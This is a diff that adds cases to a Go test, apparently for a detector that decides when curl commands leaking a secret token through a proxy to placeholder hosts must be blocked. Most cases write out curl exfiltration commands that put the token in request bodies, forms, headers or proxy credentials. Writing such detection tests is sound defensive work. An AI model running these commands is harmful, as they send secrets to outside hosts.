@@ -39,6 +39,151 @@ func TestTrustedActionCurlProxyMetadataEgress(t *testing.T) {
 			wantEnforce: true,
 		},
 		{
+			name: "literal body retains external origin proof through proxy",
+			command: "curl --noproxy '' --proxy http://proxy.example --data '" +
+				token + "' http://origin.example",
+			wantEnforce: true,
+		},
+		{
+			name: "projected body retains HTTPS origin proof through proxy",
+			command: "curl --proxy https://proxy.example --data-urlencode 'key=" +
+				token + " value' https://origin.example",
+			wantEnforce: true,
+		},
+		{
+			name: "literal multipart body retains external origin proof",
+			command: "curl --proxy1.0 http://proxy.example --form-string 'key=" +
+				token + "' http://origin.example",
+			wantEnforce: true,
+		},
+		{
+			name: "output option preserves proxied body proof",
+			command: "curl --proxy http://proxy.example --data '" + token +
+				"' --output /tmp/response http://origin.example",
+			wantEnforce: true,
+		},
+		{
+			name: "origin header preserves proxied body proof",
+			command: "curl --proxy http://proxy.example --data '" + token +
+				"' --header X-Test:safe http://origin.example",
+			wantEnforce: true,
+		},
+		{
+			name: "validated timeout preserves proxied body proof",
+			command: "curl --proxy http://proxy.example --data '" + token +
+				"' --max-time 5 http://origin.example",
+			wantEnforce: true,
+		},
+		{
+			name: "huge retry aborts before proxy",
+			command: "curl --proxy http://proxy.example --data '" + token +
+				"' --retry 999999999999999999999999 http://origin.example",
+		},
+		{
+			name: "huge timeout aborts before proxy",
+			command: "curl --proxy http://proxy.example --data '" + token +
+				"' --max-time 2147483.648 http://origin.example",
+		},
+		{
+			name: "invalid raw URL query aborts before proxy",
+			command: "curl --proxy http://proxy.example --data '" + token +
+				"' --url-query '+bad space' http://origin.example",
+		},
+		{
+			name: "remote name without filename aborts before proxy",
+			command: "curl --proxy http://proxy.example --data '" + token +
+				"' --remote-name http://origin.example/",
+		},
+		{
+			name: "proxy credentials remain proven with safe body",
+			command: "curl --proxy http://proxy.example --proxy-user proxy:" +
+				token + " --data safe http://origin.example",
+			wantEnforce: true,
+		},
+		{
+			name: "output and timeout preserve proxy credentials",
+			command: "curl --proxy http://proxy.example --proxy-user proxy:" +
+				token + " --data safe --output /tmp/response --max-time 5 " +
+				"http://origin.example",
+			wantEnforce: true,
+		},
+		{
+			name: "ordinary header override suppresses generated proxy credentials",
+			command: "curl --proxy http://proxy.example --proxy-user proxy:" +
+				token + " --header 'Proxy-Authorization: safe' --data safe " +
+				"http://origin.example",
+		},
+		{
+			name: "HTTP proxy receives plaintext body for local origin",
+			command: "curl --proxy http://proxy.example --data '" + token +
+				"' http://127.0.0.1/upload",
+			wantEnforce: true,
+		},
+		{
+			name: "HTTPS origin body remains encrypted from proxy",
+			command: "curl --proxy http://proxy.example --data '" + token +
+				"' https://127.0.0.1/upload",
+		},
+		{
+			name: "literal proxy header remains proven with body",
+			command: "curl --proxy http://proxy.example --proxy-header " +
+				"'X-Proxy-Key: " + token + "' --data safe http://origin.example",
+			wantEnforce: true,
+		},
+		{
+			name: "multipart generated content type suppresses proxy header",
+			command: "curl --proxy http://proxy.example --proxy-header " +
+				"'Content-Type: " + token +
+				"' --form-string key=safe http://127.0.0.1/upload",
+		},
+		{
+			name: "get moves data outside proxy body lane",
+			command: "curl --proxy http://proxy.example --get --data '" + token +
+				"' http://127.0.0.1/upload",
+		},
+		{
+			name: "file backed body remains detection only",
+			command: "curl --proxy http://proxy.example --data-binary '@/tmp/" +
+				token + "' http://origin.example",
+		},
+		{
+			name: "stdin body remains detection only",
+			command: "curl --proxy http://proxy.example --data-binary @- " +
+				"'http://origin.example/#" + token + "'",
+		},
+		{
+			name: "dynamic body remains detection only",
+			command: "curl --proxy http://proxy.example --data \"" + token +
+				"${EXTRA}\" http://origin.example",
+		},
+		{
+			name: "encoded multipart body remains detection only",
+			command: "curl --proxy http://proxy.example --form 'key=" + token +
+				";encoder=base64' http://origin.example",
+		},
+		{
+			name:    "malformed proxied form aborts before request",
+			command: "curl --proxy http://proxy.example --form '" + token + "' http://origin.example",
+		},
+		{
+			name: "malformed proxied form string aborts before request",
+			command: "curl --proxy http://proxy.example --form-string '" + token +
+				"' http://origin.example",
+		},
+		{
+			name:    "malformed direct form cannot authorize origin upload",
+			command: "curl --form '" + token + "' https://origin.example",
+		},
+		{
+			name:    "malformed direct form string cannot authorize origin upload",
+			command: "curl --form-string '" + token + "' https://origin.example",
+		},
+		{
+			name: "continue at with body remains detection only",
+			command: "curl --proxy http://proxy.example --data '" + token +
+				"' --continue-at 1 http://origin.example",
+		},
+		{
 			name: "parser owned inert flags preserve proxy proof",
 			command: "curl -s --disable --insecure --compressed --head " +
 				"--proxy https://proxy.example " +
@@ -72,6 +217,25 @@ func TestTrustedActionCurlProxyMetadataEgress(t *testing.T) {
 			name: "literal proxy header reaches external proxy",
 			command: "curl --proxy http://proxy.example --proxy-header " +
 				"'X-Proxy-Key: " + token + "' https://origin.example",
+			wantEnforce: true,
+		},
+		{
+			name: "ordinary header reaches external forward proxy",
+			command: "curl --proxy http://proxy.example --header 'X-Key: " +
+				token + "' http://127.0.0.1/",
+			wantEnforce: true,
+		},
+		{
+			name: "ordinary header reaches CONNECT without separate list",
+			command: "curl --proxy http://proxy.example --header 'X-Key: " +
+				token + "' https://127.0.0.1/",
+			wantEnforce: true,
+		},
+		{
+			name: "separate proxy header list preserves generated credentials",
+			command: "curl --proxy http://proxy.example --proxy-user proxy:" +
+				token + " --header 'Proxy-Authorization: safe' " +
+				"--proxy-header X-Proxy:safe https://origin.example",
 			wantEnforce: true,
 		},
 		{
